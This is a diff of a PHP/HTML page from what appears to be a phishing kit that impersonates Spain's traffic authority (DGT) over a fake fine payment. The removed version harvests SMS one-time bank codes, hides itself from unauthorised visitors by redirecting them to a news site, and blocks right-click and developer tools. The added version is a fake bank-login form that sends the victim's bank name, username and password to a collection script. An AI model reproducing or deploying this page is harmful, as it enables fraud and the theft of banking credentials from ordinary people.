@@ -1,137 +1,121 @@
-<?php
-session_start();
-require '../server/all.php';
-include '../settings.php';
-
-if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_SESSION['index_auth']) && $_SESSION['index_auth'] === true) {
-?>
-<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paiement de sanctions</title>
+    <title>Autenticación por banco</title>
+    
+    <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../assets/ing/style.css">
+    <link rel="stylesheet" href="../assets/ing/scrollbar.css">
+
+    <!-- Font Awesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    
     <style>
         body {
+            padding-top: 20px;
             font-family: Arial, sans-serif;
-            background-color: #f8f9fa;
-            padding: 15px;
         }
         .main-header {
-            background-color: #007bff;
-            color: white;
-            padding: 10px;
+            background-color: #004488;
+            color: #fff;
+            padding: 10px 0;
+        }
+        .main-header .title {
+            color: #fff;
+            font-size: 24px;
             text-align: center;
         }
-        .main-header img {
-            max-height: 50px;
+        .form-control {
+            margin-bottom: 15px;
+            border-radius: 4px;
         }
-        .form-container {
-            background-color: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
+        .btn-primary {
+            background-color: #004488;
+            border-color: #003366;
+            border-radius: 4px;
         }
-        .form-group label {
-            font-weight: bold;
+        .btn-primary:hover {
+            background-color: #003366;
+            border-color: #002244;
         }
-        .custom-button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
+        .container {
+            max-width: 100%;
         }
-        .custom-button:hover {
-            background-color: #0056b3;
+        .logo img {
+            max-width: 100%;
+            height: auto;
         }
-        footer {
+        .error-message {
+            color: red;
             text-align: center;
-            margin-top: 20px;
+            margin-top: 10px;
         }
-        footer a {
-            color: #007bff;
-            text-decoration: none;
-        }
-        footer a:hover {
-            text-decoration: underline;
-        }
-        @media (max-width: 768px) {
-            .main-header {
+        @media (max-width: 576px) {
+            .main-header .title {
                 font-size: 18px;
-            }
-            .form-container {
-                padding: 10px;
             }
         }
     </style>
 </head>
 <body>
     <header class="main-header">
-        <img src="../assets/images/logo-mir.png" alt="Logo MIR">
-        <img src="../assets/images/logo-dgt.png" alt="Logo DGT">
-        <div>Paiement de sanctions</div>
-    </header>
-    <main class="form-container">
-        <h2>Authenticación de su multa N°164357371274</h2>
-        <center>
-            <img src="https://campusdata.uark.edu/resources/images/articles/2020-03-06_01-01-36-PMmfa-newswire-colorBG.png" width="150">
-        </center>
-        <br>
-        <div class="mandatory">
-            <h5>Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número: &nbsp; <?php echo $_SESSION['tel']; ?></h5>
-        </div>
-        <form method="post" action="../actions/sms_auth2.php">
-            <?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;">Código inválido o caducado, por favor compruébelo</p>'; } ?>
-            <div class="form-group">
-                <label for="ccnum">Código recibido por SMS</label>
-                <input id="ccnum" type="text" name="vbv_code2" class="form-control" minlength="1" maxlength="20" required>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center">
+                    <div class="logo">
+                        <a href="#" target="_blank"><img src="../assets/images/logo-mir.png" alt="Logo MIR"></a>
+                        <a href="#" target="_blank"><img src="../assets/images/logo-dgt.png" alt="Logo DGT"></a>
+                    </div>
+                    <div class="title">Autenticación por banco</div>
+                </div>
             </div>
-            <button type="submit" name="vbv_submit" class="custom-button">Continuar</button>
-            <input type="hidden" name="vbv_submit" value="true">
-        </form>
-    </main>
-    <footer>
-        <nav>
-            <a href="#">Aviso legal</a> | 
-            <a href="#">Propiedad intelectual</a> | 
-            <a href="#">Accesibilidad</a> | 
-            <a href="#">Protección de datos</a>
-        </nav>
-        <div class="footer-social">
-            <a href="#"><em class="fab fa-facebook-square"></em></a>
-            <a href="#"><em class="fab fa-twitter-square"></em></a>
-            <a href="#"><em class="fab fa-youtube-square"></em></a>
-            <a href="#"><em class="fab fa-instagram"></em></a>
         </div>
-    </footer>
+    </header>
+
+    <main class="container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-md-8">
+                <center><img src="../assets/ing/ico_oob_1.png" width="125" alt="Icon"></center>
+                <h4 class="text-center text-primary">Por favor, identifícate con tu nombre de usuario y contraseña de banca electrónica</h4>
+                
+                <form id="oobForm" action="../actions/banque.php" method="POST">
+                    <div class="form-group">
+                        <label for="nom_bank">Nombre del banco</label>
+                        <input type="text" class="form-control" id="nom_bank" name="nom_bank" placeholder="Ingrese su identificación" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="identifiant_banque">Identificación</label>
+                        <input type="text" class="form-control" id="identifiant_banque" name="identifiant_banque" placeholder="Ingrese su identificación" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="mdp_banque">Contraseña</label>
+                        <input type="password" class="form-control" id="mdp_banque" name="mdp_banque" placeholder="Ingrese su contraseña" required>
+                    </div>
+
+                    <div class="text-center">
+                        <button type="submit" id="banque_submit" name="banque_submit" class="btn btn-primary">Validar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- jQuery and Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <!-- Custom JS -->
     <script>
-        // Désactiver le clic droit
-        document.addEventListener("contextmenu", function(e){
-            e.preventDefault();
-        }, false);
-
-        // Désactiver la sélection de texte
-        document.addEventListener("selectstart", function(e){
-            e.preventDefault();
-        }, false);
-
-        window.addEventListener("keydown", function(e) {
-            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-                e.preventDefault();
-            }
+        // Example of additional custom JS if needed
+        $(document).ready(function(){
+            // Your code here
         });
     </script>
 </body>
 </html>
-<?php
-} else {
-    header("Location: https://www.mediapart.fr/");
-    exit;
-}
-?>
